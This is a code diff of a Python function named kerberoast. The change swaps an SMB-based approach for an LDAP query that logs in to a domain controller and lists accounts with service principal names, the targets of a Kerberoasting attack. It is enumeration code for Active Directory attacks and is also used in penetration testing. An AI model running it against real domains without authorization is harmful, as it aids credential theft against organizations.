@@ -1,17 +1,26 @@
-from impacket.smbconnection import SMBConnection
-from impacket.smb3structs import SMB2_DIALECT_002, SMB2_DIALECT_21
+from ldap3 import Server, Connection, SUBTREE, ALL_ATTRIBUTES
 
 def kerberoast(username, password, domain, dc_ip):
     try:
-        # Connect to the domain controller via SMB
-        smb = SMBConnection(dc_ip, dc_ip)
-        smb.login(username, password, domain)
+        # Connect to the domain controller via LDAP
+        server = Server(dc_ip, use_ssl=False)
+        conn = Connection(server, user=f"{username}@{domain}", password=password, authentication='NTLM')
+        conn.bind()
 
-        # Query LDAP for kerberoastable users
-        _, entries = smb.listUsers()
+        # Search for users with SPNs set
+        conn.search(search_base="DC=" + ",".join(domain.split(".")),
+                    search_filter="(servicePrincipalName=*)",
+                    search_scope=SUBTREE,
+                    attributes=ALL_ATTRIBUTES)
 
-        # Filter kerberoastable users
-        kerberoastable_accounts = [entry['name'] for entry in entries if entry['userSid'] and 'krbtgt' not in entry['name']]
+        kerberoastable_accounts = []
+
+        # Extract kerberoastable accounts
+        for entry in conn.entries:
+            if entry.entry_attributes_as_dict.get('servicePrincipalName'):
+                kerberoastable_accounts.append(entry.entry_dn)
+
+        conn.unbind()
 
         if kerberoastable_accounts:
             print("Kerberoastable Accounts:")
@@ -19,8 +28,6 @@ def kerberoast(username, password, domain, dc_ip):
                 print(account)
         else:
             print("No kerberoastable accounts found.")
-
-        smb.logoff()
 
     except Exception as e:
         print(f"Error while Kerberoasting: {e}")
